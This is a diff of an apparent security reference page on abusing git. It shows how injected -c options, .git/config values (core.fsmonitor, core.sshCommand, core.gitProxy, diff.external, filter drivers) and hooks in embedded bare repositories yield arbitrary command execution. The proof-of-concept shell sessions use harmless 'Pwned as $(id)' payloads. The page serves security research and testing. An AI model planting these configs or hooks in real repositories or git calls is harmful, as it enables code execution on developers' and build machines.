@@ -1,45 +1,124 @@
 # git
 
-## Abusing bare repositories
+{% embed url="https://git-scm.com/docs/git" %}
 
-You can use bare repositories to deliver custom git hooks and execute arbitrary code. For instance, if the vulnerable code executes the following bash commands:
+## -c/--config-env
 
-```bash
-$ git clone -- "<REPO>" "target_directory"
-$ cd "target_directory"
-$ git checkout "subproject"
-```
+[-c/--config-env](https://git-scm.com/docs/git#Documentation/git.txt--cltnamegtltvaluegt) passes a configuration parameter to the command. The value given will override values from configuration files. Check out the [Abuse via .git/config](#abuse-via-gitconfig) section to find parameters that can be abused.
 
-You can create a repo with the `subproject` folder, which is a bare repository with a payload in the post checkout hook:
+## Abusing a git directory
 
-```bash
-$ git clone "<REPO>" target_directory
-$ cd target_directory
-$ mkdir subproject
-$ cd subproject
-$ git init --bare
-$ echo "#!/bin/sh" > hooks/post-checkout
-$ echo "echo 'arbitrary code here'" >> hooks/post-checkout
-$ # commit and push
-```
+A git directory maintains internal state, or metadata, relating to a git repository. It is created on a user's machine when:
 
-{% embed url="https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md" %}
+- The user does `git init` to intialise an empty local repository
+- The user does `git clone <repository>` to clone an existing repository from a remote location
+
+The structure of a git directory is documented at https://git-scm.com/docs/gitrepository-layout
+
+Note that a git directory is often, but not always, a directory named `.git` at the root of a repo. There are several variables that can redefine a path:
+
+- [GIT_DIR](https://git-scm.com/docs/git#Documentation/git.txt-codeGITDIRcode) environment variable or [--git-dir](https://git-scm.com/docs/git#Documentation/git.txt---git-dirltpathgt) command-line option specifies a path to use instead of the default `.git` for the base of the repository.
+- [GIT_COMMON_DIR](https://git-scm.com/docs/git#Documentation/git.txt-codeGITCOMMONDIRcode) environment variable or [commondir](https://git-scm.com/docs/gitrepository-layout#Documentation/gitrepository-layout.txt-commondir) file specifies a path from which non-worktree files will be taken, which are normally in `$GIT_DIR`.
+
+Notice that the [bare repos](https://git-scm.com/docs/git-init#Documentation/git-init.txt---bare) do not have a `.git` directory at all.
 
 References:
-- [Writeup: 4 Google Cloud Shell bugs explained – bug #3](https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-bug-3/)
-- [githooks docs](https://git-scm.com/docs/githooks)
+- [Writeup: gh run download implementation allows overwriting git repository configuration upon artifacts downloading](https://github.com/Metnew/write-ups/blob/e6f65cf6ff60434a37ee230d828336809dd25f5a/rce-gh-cli-run-download/README.md)
 
-## git-clone
+### Abuse via .git/config
 
-{% embed url="https://git-scm.com/docs/git-clone" %}
+`.git/config` allows for the configuration of [options](https://git-scm.com/docs/git-config#_variables) on a per-repo basis. Many of the options allow for the specification of commands that will be executed in various situations, but some of these situations only arise when a user interacts with a git repository in a particular way.
 
-### --config
+There are at least the following ways to set the options:
 
-Set a configuration variable in the newly-created repository; this takes effect immediately after the repository is initialized, but before the remote history is fetched or any files checked out.
+1. On a system-wide basis using [/etc/gitconfig](https://git-scm.com/docs/git-config#Documentation/git-config.txt-prefixetcgitconfig) file
+2. On a global basis using [~/git/config](https://git-scm.com/docs/git-config#Documentation/git-config.txt-XDGCONFIGHOMEgitconfig) or [~/.gitconfig](https://git-scm.com/docs/git-config#Documentation/git-config.txt-gitconfig) files
+3. On a local per-repo basis using [.git/config](https://git-scm.com/docs/git-config#Documentation/git-config.txt-GITDIRconfig) file
+4. On a local per-repo basis using [.git/config.worktree](https://git-scm.com/docs/git-config#Documentation/git-config.txt-GITDIRconfigworktree) file. This is optional and is only searched when `extensions.worktreeConfig` is present in `.git/config`
+5. On a local per-repo basis using [git -c/--config-env](https://git-scm.com/docs/git#Documentation/git.txt--cltnamegtltvaluegt) option
+6. On a local per-repo basis using [git-clone -c/--config](https://git-scm.com/docs/git-clone#Documentation/git-clone.txt--cltkeygtltvaluegt) option
+
+#### core.gitProxy
+
+[core.gitProxy](https://git-scm.com/docs/git-config#Documentation/git-config.txt-coregitProxy) gives a command that will be executed when establishing a connection to a remote using the `git://` protocol
+
+```bash
+$ echo $'#!/bin/bash\necho \\"Pwned as $(id)\\">&2' > pwn.sh
+$ chmod +x pwn.sh
+$ git clone -c core.gitProxy="./pwn.sh" git://github.com/user/project.git
+Cloning into 'project'...
+"Pwned as uid=0(root) gid=0(root) groups=0(root)"
+fatal: Could not read from remote repository.
+
+Please make sure you have the correct access rights and the repository exists.
+```
+
+#### core.fsmonitor
+
+The [core.fsmonitor](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corefsmonitor) option is used as a command which will identify all files that may have changed since the requested date/time.
+
+In other words, many operations provided by the git will invoke the command given by `core.fsmonitor` to quickly limit the operation's scope to known-changed files in the interest of performance.
+
+At least the following git operations invoke the command given by `core.fsmonitor`:
+
+- `git status` used to show information about the state of the working tree, including whether any files have uncommitted changes
+- `git add <pathspec>` used to stage changes for committing to the repo
+- `git rm --cached <file>` used to unstage changes
+- `git commit` used to commit staged changes
+- `git checkout <pathspec>` used to check out a file, commit, tag, branch, etc.
+
+For operations that take a filename, `core.fsmonitor` will fire even if the filename provided does not exist.
+
+```bash
+$ cd $(mktemp -d)
+# initialized empty Git repository in /tmp/tmp.hLncfRcxgC/.git/
+$ git init
+# change core.fsmonitor so that it echoes a message to STDERR whenever it is invoked
+$ echo $'\tfsmonitor = "echo \\"Pwned as $(id)\\">&2; false"' >> .git/config
+$ cat .git/config
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+	fsmonitor = "echo \"Pwned as $(id)\">&2; false"
+# git-status
+$ git status
+Pwned as uid=0(root) gid=0(root) groups=0(root)
+Pwned as uid=0(root) gid=0(root) groups=0(root)
+On branch main
+
+No commits yet
+
+nothing to commit (create/copy files and use "git add" to track)
+
+# git-add
+$ touch aaaa
+$ git add aaaa
+Pwned as uid=0(root) gid=0(root) groups=0(root)
+Pwned as uid=0(root) gid=0(root) groups=0(root)
+
+$ git add zzzz
+Pwned as uid=0(root) gid=0(root) groups=0(root)
+Pwned as uid=0(root) gid=0(root) groups=0(root)
+fatal: pathspec 'zzzz' did not match any files
+
+# git-commit
+$ git commit -m 'add aaaa'
+Pwned as uid=0(root) gid=0(root) groups=0(root)
+Pwned as uid=0(root) gid=0(root) groups=0(root)
+[main (root-commit) 7c2f2c6] add aaaa
+ 1 file changed, 0 insertions(+), 0 deletions(-)
+ create mode 100644 aaaa
+```
+
+References:
+- [Research: Git honours embedded bare repos, and exploitation via core.fsmonitor in a directory's .git/config affects IDEs, shell prompts and Git pillagers](https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md)
+- [Research: Securing Developer Tools - Git Integrations](https://blog.sonarsource.com/securing-developer-tools-git-integrations)
 
 #### core.hooksPath
 
-`core.hooksPath` sets different path to hooks. You can create the post checkout hook within a repository, set the path to hooks with the `hooksPath`, and execute arbitrary code.
+[core.hooksPath](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) sets different path to [hooks](https://git-scm.com/docs/githooks). You can create the post checkout hook within a repository, set the path to hooks with the `hooksPath`, and execute arbitrary code.
 
 ```bash
 $ git clone "<REPO>" target_directory
@@ -50,7 +129,7 @@ $ echo "echo 'arbitrary code here'" >> hooks/post-checkout
 $ # commit and push
 ```
 
-To execute the payload, run the git-clone:
+To execute the payload, run the `git-clone`:
 
 ```bash
 $ git clone -c core.hooksPath=hooks "<REPO>"
@@ -59,6 +138,87 @@ $ git clone -c core.hooksPath=hooks "<REPO>"
 References:
 - [git-config docs: core.hooksPath](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath)
 - [githooks docs](https://git-scm.com/docs/githooks)
+
+#### core.sshCommand
+
+[core.sshCommand](https://git-scm.com/docs/git-config#Documentation/git-config.txt-coresshCommand) gives a command that will be executed when establishing a connection to a remote using the SSH protocol. If this variable is set, `git fetch` and `git push` will use the specified command instead of `ssh` when they need to connect to a remote system.
+
+```bash
+$ echo $'#!/bin/bash\necho \\"Pwned as $(id)\\">&2' > pwn.sh
+$ chmod +x pwn.sh
+$ git clone -c core.sshCommand="./pwn.sh" git@github.com:user/project.git
+# or
+$ git clone -c core.sshCommand="./pwn.sh" ssh://github.com/user/project.git
+Cloning into 'project'...
+"Pwned as uid=0(root) gid=0(root) groups=0(root)"
+fatal: Could not read from remote repository.
+
+Please make sure you have the correct access rights and the repository exists.
+```
+
+#### diff.external
+
+[diff.external](https://git-scm.com/docs/git-config#Documentation/git-config.txt-diffexternal) gives a command that will be used instead of git's internal diff function.
+
+```bash
+$ echo $'#!/bin/bash\necho \\"Pwned as $(id)\\">&2' > pwn.sh
+$ chmod +x pwn.sh
+$ git clone https://github.com/user/project.git
+$ cd project
+$ git -c diff.external="../pwn.sh" HEAD 480e4c9
+"Pwned as uid=0(root) gid=0(root) groups=0(root)"
+```
+
+#### filter.&lt;driver&gt;.clean and filter.&lt;driver&gt;.smudge
+
+[filter.<driver>.clean](https://git-scm.com/docs/git-config#Documentation/git-config.txt-filterltdrivergtclean) is used to convert the content of a worktree file to a blob upon checkin.
+
+[filter.<driver>.smudge](https://git-scm.com/docs/git-config#Documentation/git-config.txt-filterltdrivergtsmudge) is used to convert the content of a blob object to a worktree file upon checkout.
+
+```bash
+$ cd $(mktemp -d)
+# initialized empty Git repository in /tmp/tmp.hLncfRcxgC/.git/
+$ git init
+# filter.&lt;driver&gt;.clean and filter.&lt;driver&gt;.smudge
+# so that they echo a message to STDERR whenever they are invoked
+$ echo $'[filter "any"]\n\tsmudge = echo \\"Pwned smudge as $(id)\\">&2\n\tclean = echo \\"Pwned clean as $(id)\\">&2' >> ./.git/config
+# add filter to .gitattributes
+$ touch example
+$ git add ./example
+$ git commit -m 'commit'
+$ echo "*  text  filter=any" > .gitattributes
+$ git status
+Pwned clean as uid=0(root) gid=0(root) groups=0(root)
+On branch master
+Untracked files:
+  (use "git add <file>..." to include in what will be committed)
+	.gitattributes
+
+nothing added to commit but untracked files present (use "git add" to track)
+
+$ git add .gitattributes
+Pwned clean as uid=0(root) gid=0(root) groups=0(root)
+```
+
+```bash
+$ cd $(mktemp -d)
+# initialized empty Git repository in /tmp/tmp.hLncfRcxgC/.git/
+$ git init
+# filter.&lt;driver&gt;.clean and filter.&lt;driver&gt;.smudge
+# so that they echo a message to STDERR whenever they are invoked
+$ echo $'[filter "any"]\n\tsmudge = echo \\"Pwned smudge as $(id)\\">&2\n\tclean = echo \\"Pwned clean as $(id)\\">&2' >> ./.git/config
+# add filter to .gitattributes
+$ echo "*  text  filter=any" > .gitattributes
+$ git fetch
+$ git checkout main
+Pwned smudge as uid=0(root) gid=0(root) groups=0(root)
+Pwned smudge as uid=0(root) gid=0(root) groups=0(root)
+Branch 'main' set up to track remote branch 'main' from 'origin'.
+Switched to a new branch 'main'
+```
+
+References:
+- [Write up: RCE in GitHub Desktop < 2.9.4](https://github.com/Metnew/write-ups/tree/main/rce-github-desktop-2.9.3)
 
 #### http.proxy and http.&lt;URL&gt;.proxy
 
@@ -75,6 +235,56 @@ References:
 - [Report: Injection of `http.<url>.*` git config settings leading to SSRF](https://hackerone.com/reports/855276)
 - [git-config docs: http.proxy](https://git-scm.com/docs/git-config#Documentation/git-config.txt-httpproxy)
 - [git-config docs: remote.<name>.proxy](https://git-scm.com/docs/git-config#Documentation/git-config.txt-remoteltnamegtproxy)
+
+### Abuse via .git/hooks/
+
+Various files within [.git/hooks/](https://git-scm.com/docs/githooks) are [executed upon certain git operations](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks). For example:
+
+- `pre-commit` and `post-commit` are executed before and after a commit operation respectively
+- `post-checkout` is executed after checkout operation
+- `pre-push` is executed before a push operation
+
+On filesystems that differentiate between executable and non-executable files, Hooks are only executed if the respective file is executable. Furthermore, hooks only execute given certain user interaction, such as upon performing a commit.
+
+For instance, you can use bare repositories to deliver custom git hooks and execute arbitrary code:
+
+```bash
+# clone or create a repo
+$ git clone "<REPO>" target_directory
+$ cd target_directory
+# add subproject as a bare repo
+$ mkdir subproject
+$ cd subproject
+$ git init --bare
+# add malicious hook
+$ echo "#!/bin/sh" > hooks/post-checkout
+$ echo "echo 'arbitrary code here'" >> hooks/post-checkout
+# commit and push
+```
+
+If the vulnerable code executes the following bash commands against the prepared repository, it will trigger the custom hook execution and result in the arbitrary code being executed:
+
+```bash
+$ git clone -- "<REPO>" "target_directory"
+$ cd "target_directory"
+$ git checkout "subproject"
+```
+
+References:
+- [Writeup: 4 Google Cloud Shell bugs explained – bug #3](https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-bug-3/)
+- [Research: Git honours embedded bare repos, and exploitation via core.fsmonitor in a directory's .git/config affects IDEs, shell prompts and Git pillagers](https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md)
+
+### Abuse via .git/index
+
+You can achieve an arbitrary write primitive using a crafted `.git/index` file, check an [advisory](https://drivertom.blogspot.com/2021/08/git.html).
+
+## git-clone
+
+{% embed url="https://git-scm.com/docs/git-clone" %}
+
+### -c/--config
+
+[-c/--config](https://git-scm.com/docs/git-clone#Documentation/git-clone.txt--cltkeygtltvaluegt) sets a configuration variable in the newly-created repository; this takes effect immediately after the repository is initialized, but before the remote history is fetched or any files checked out. Check the [Abuse via .git/config](#abuse-via-gitconfig) section to find variables that can be abused.
 
 ### ext URLs
 
@@ -130,7 +340,7 @@ References:
 
 ### --output
 
-`output` definea a specific file to output instead of stdout. You can use this to rewrite arbitrary files.
+`output` define a specific file to output instead of stdout. You can use this to rewrite arbitrary files.
 
 ```bash
 $ git log --output=/tmp/arbitrary_file
